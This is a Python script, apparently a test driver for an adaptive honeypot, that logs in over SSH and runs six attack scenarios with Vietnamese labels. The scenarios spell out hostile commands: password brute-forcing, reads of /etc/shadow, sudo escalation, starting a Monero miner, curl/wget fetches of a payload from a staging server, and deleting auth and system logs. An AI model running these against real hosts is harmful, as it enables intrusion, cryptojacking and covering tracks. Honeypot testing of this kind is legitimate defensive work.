#!/usr/bin/env python3
"""
Attack Runner for Adaptive Honeypot.
Chạy toàn bộ chuỗi 6 kịch bản tấn công vào IP mục tiêu (192.168.101.250:2222).
"""

import sys
import time
import socket
import paramiko

if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

TARGET_HOST = "192.168.101.250"
TARGET_PORT = 2222

ALL_SCENARIOS = [
    {
        "id": "ssh-bruteforce-001",
        "title": "💥 1. Dò quét Mật khẩu SSH (Brute Force / Password Spraying)",
        "type": "bruteforce",
        "attempts": [("admin", "admin123"), ("root", "toor"), ("guest", "guest2026"), ("support", "support!@#")],
        "success": ("root", "123"),
        "commands": ["whoami", "id"]
    },
    {
        "id": "ssh-discovery-001",
        "title": "🔍 2. Trinh sát Môi trường & Mạng (System & Network Discovery)",
        "type": "commands",
        "user": "root",
        "pass": "123",
        "commands": [
            "whoami",
            "uname -a",
            "id",
            "cat /etc/os-release",
            "cat /etc/passwd",
            "ps -ef",
            "ip a",
            "netstat -tuln",
            "df -h",
            "uptime"
        ]
    },
    {
        "id": "ssh-privilege-escalation-001",
        "title": "👑 3. Leo thang Đặc quyền (Privilege Escalation via Sudo)",
        "type": "commands",
        "user": "ubuntu",
        "pass": "123",
        "commands": [
            "id",
            "sudo -l",
            "sudo cat /etc/shadow",
            "sudo su",
            "whoami",
            "exit"
        ]
    },
    {
        "id": "ssh-mining-execution-001",
        "title": "⛏️ 4. Khởi chạy Bot Đào Coin (Cryptomining Resource Hijacking)",
        "type": "commands",
        "user": "root",
        "pass": "123",
        "commands": [
            "cd /tmp",
            "nohup ./xmr -o pool.minexmr.com:443 -u 48A... --cpu-max-threads-hint=100 &",
            "ps aux | grep xmr",
            "top -b -n 1"
        ]
    },
    {
        "id": "ssh-malware-download-001",
        "title": "📥 5. Tải Mã độc từ Máy chủ C2 (Ingress Tool Transfer)",
        "type": "commands",
        "user": "root",
        "pass": "123",
        "commands": [
            "cd /tmp",
            "curl -O http://192.168.1.50:8000/update.sh",
            "wget http://192.168.1.50:8000/xmr_miner -O .miner",
            "chmod +x update.sh .miner",
            "ls -la"
        ]
    },
    {
        "id": "ssh-defense-evasion-001",
        "title": "🧹 6. Xóa Dấu vết Hệ thống (Defense Evasion / Log Clearing)",
        "type": "commands",
        "user": "root",
        "pass": "123",
        "commands": [
            "cat /dev/null > ~/.bash_history",
            "history -c",
            "rm -f /var/log/auth.log",
            "rm -f /var/log/syslog"
        ]
    }
]


def run_single_scenario(sc: dict, host=TARGET_HOST, port=TARGET_PORT):
    print("\n" + "=" * 75)
    print(f"🚀 [KỊCH BẢN]: {sc['title']}")
    print(f"🎯 Mục tiêu: {host}:{port}")
    print("=" * 75)

    # 1. Brute Force
    if sc.get("type") == "bruteforce":
        print("[*] Bắt đầu thử các mẫu tài khoản mật khẩu sai (Brute-force)...")
        for u, p in sc["attempts"]:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(host, port=port, username=u, password=p, timeout=5, allow_agent=False, look_for_keys=False)
                client.close()
            except paramiko.AuthenticationException:
                print(f"   [-] Ghi nhận bẫy từ chối (Auth_Failed): '{u}':'{p}' -> OK (Kích hoạt T1110)")
            except Exception as e:
                print(f"   [!] Lỗi kết nối: {e}")
            time.sleep(0.3)

        u_ok, p_ok = sc["success"]
        user, pwd = u_ok, p_ok
    else:
        user, pwd = sc["user"], sc["pass"]

    # 2. Login & Shell
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port=port, username=user, password=pwd, timeout=8, allow_agent=False, look_for_keys=False)
        print(f"   ✅ [AUTH SUCCESS] Đã đăng nhập vào Sandbox với user '{user}'!")
        
        channel = client.invoke_shell()
        time.sleep(0.5)

        # Đọc banner nếu có
        if channel.recv_ready():
            banner = channel.recv(2048).decode("utf-8", errors="ignore")
            # print(f"   [BANNER]: {banner[:100]}...")

        # Chạy từng lệnh
        for cmd in sc["commands"]:
            print(f"   >> [LỆNH]: {cmd}")
            channel.send(cmd + "\n")
            time.sleep(0.4)
            resp = ""
            while channel.recv_ready():
                resp += channel.recv(4096).decode("utf-8", errors="ignore")
            clean_resp = resp.replace("\r\n", "\n").strip()
            first_lines = "\n".join([line for line in clean_resp.split("\n") if line.strip() and not line.startswith("root@") and not line.startswith("ubuntu@")][:3])
            if first_lines:
                print(f"      << [OUTPUT]: {first_lines[:150]}")

        channel.send("exit\n")
        time.sleep(0.2)
        channel.close()
        client.close()
        print(f"   🚪 [SESSION CLOSED] Đã đóng phiên an toàn cho kịch bản '{sc['id']}'")
    except Exception as e:
        print(f"   [!] Lỗi kịch bản: {e}")


def main():
    target_ip = sys.argv[1] if len(sys.argv) > 1 else TARGET_HOST
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else TARGET_PORT
    
    print("=" * 80)
    print(f"🔥 [CHẠY TẤT CẢ KỊCH BẢN TẤN CÔNG] MỤC TIÊU: {target_ip}:{target_port}")
    print(f"📋 Tổng số kịch bản chuẩn bị thực thi: {len(ALL_SCENARIOS)}")
    print("=" * 80)

    for idx, sc in enumerate(ALL_SCENARIOS, 1):
        print(f"\n[{idx}/{len(ALL_SCENARIOS)}] Đang khởi chạy kịch bản...")
        run_single_scenario(sc, host=target_ip, port=target_port)
        time.sleep(0.8)

    print("\n" + "=" * 80)
    print("🎉 ĐÃ HOÀN THÀNH TẤT CẢ 6 KỊCH BẢN TẤN CÔNG VÀO HONEYPOT!")
    print(f"🌐 Mọi sự kiện đã được ghi lại đầy đủ vào log Honeypot tại {target_ip}:{target_port}.")
    print("=" * 80)


if __name__ == "__main__":
    main()
